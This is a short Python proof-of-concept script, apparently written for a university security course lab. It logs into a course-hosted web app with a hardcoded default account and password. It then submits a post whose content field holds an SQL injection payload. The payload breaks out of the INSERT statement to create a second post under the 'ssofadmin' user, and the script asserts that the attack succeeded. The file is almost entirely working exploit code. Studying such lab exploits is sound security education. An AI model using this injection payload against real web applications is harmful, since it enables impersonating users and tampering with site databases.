import requests, random

Server = 'http://a40ff75cdce02380039a825884964b5e117af09561845c13679abcb87fe4.project.ssof.rnl.tecnico.ulisboa.pt'
session = requests.session()
salt = str(random.randint(2 ** 27, 2 ** 28)) 

#Default account investor
username = 'investor'
password = 'benfica123'

#Login
params = {'username' : username, 'password' : password }
r = session.post(Server + '/login', data=params)

headers = {'user-agent': 'my-app/0.0.1', 'Content-Type': 'application/json'}
params = {}
r = requests.get(Server + '/create_post', params=params, headers=headers, cookies = session.cookies)

#Create posts
params = {'content': "hello', 'Public'), ('ssofadmin', 'hackedPoC"+salt+"', 'Public')  -- ", 'type': 'Public'}
r = session.post(Server + '/create_post', data=params)

assert "Succesfully" in r.text
print("Successful")